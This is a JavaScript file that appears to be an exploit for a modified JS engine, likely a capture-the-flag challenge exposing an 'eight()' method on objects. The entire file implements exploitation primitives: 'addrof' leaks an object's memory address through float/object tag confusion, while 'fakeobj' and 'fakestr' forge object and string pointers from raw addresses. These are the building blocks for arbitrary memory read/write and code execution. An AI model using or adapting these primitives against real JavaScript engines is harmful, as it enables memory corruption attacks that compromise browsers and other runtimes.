let bits = new ArrayBuffer(1000);
let floatview = new Float64Array(bits);
let bitview = new Uint32Array(bits);

let addrof = function(obj){
    let first = {"int" : 420, "object" : obj};
    first.eight();
    let second = {"val" : first.int, "floattag" : 7};
    second.eight();
    floatview[0] = second.val;
    first.eight();
    second.eight();
    print(bitview);
    let result = (bitview[1] * (1 << 32)) + bitview[0];
    print(result);
    return result;
};
let fakeobj = function(thing){
    // javascript does funny truncating when using >>>, use this instead.
    var temp = Math.pow(2, 32);
    bitview[1] = Math.floor(thing/temp);
    bitview[0] = thing >>> 0;
    let o1 = {"gg" : 1, "ff" : floatview[0]};
    // shift the first value plane
    o1.eight();
    let o = {"hi" : o1.gg, "bye" : -1};
    // shift the second value plane
    // suddenly, value of thing is now tagged with an object!
    o.eight();
    const result = o.hi;
    // reshift to not corrupt pointers
    o1.eight();
    o.eight();
    return result;
};

let fakestr = function(thing){
    // javascript does funny truncating when using >>>, use this instead.
    bitview[1] = Math.floor(thing / 2**(32));
    bitview[0] = thing >>> 0;
    let o1 = {"gg" : 1, "ff" : floatview[0]};
    // shift the first value plane
    o1.eight();
    let o = {"hi" : o1.gg, "bye" : -7};
    // shift the second value plane
    // suddenly, value of thing is now tagged with a str!
    o.eight();
    let fakedstr = o.hi;
    // reshift to not corrupt pointers
    o1.eight();
    o.eight();
    return fakedstr;
};
